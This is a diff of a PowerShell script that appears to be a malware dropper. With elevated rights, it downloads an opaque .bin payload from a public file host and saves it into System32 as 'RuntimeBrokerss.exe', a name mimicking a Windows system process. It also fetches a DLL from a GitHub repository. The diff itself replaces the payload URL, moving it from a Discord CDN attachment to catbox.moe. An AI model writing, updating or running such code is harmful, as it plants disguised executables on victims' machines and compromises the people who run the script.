@@ -22,7 +22,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "RuntimeBrokerss.exe"
 $dllDestination = Join-Path $system32Path "Guna.UI2.dll"
-$exeUrl = "https://cdn.discordapp.com/attachments/1437082224481534158/1437082275274686484/kare.bin?ex=691495aa&is=6913442a&hm=d41e936b084ac68384de357ebf80399a1409fc7f58b8561641318e15f80e1060&"
+$exeUrl = "https://files.catbox.moe/rye9vw.bin"
 $dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
 
 # -----------------------------
@@ -119,5 +119,6 @@ elseif ($choice -eq "2") {
 else {
     Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
 }
+
 
 
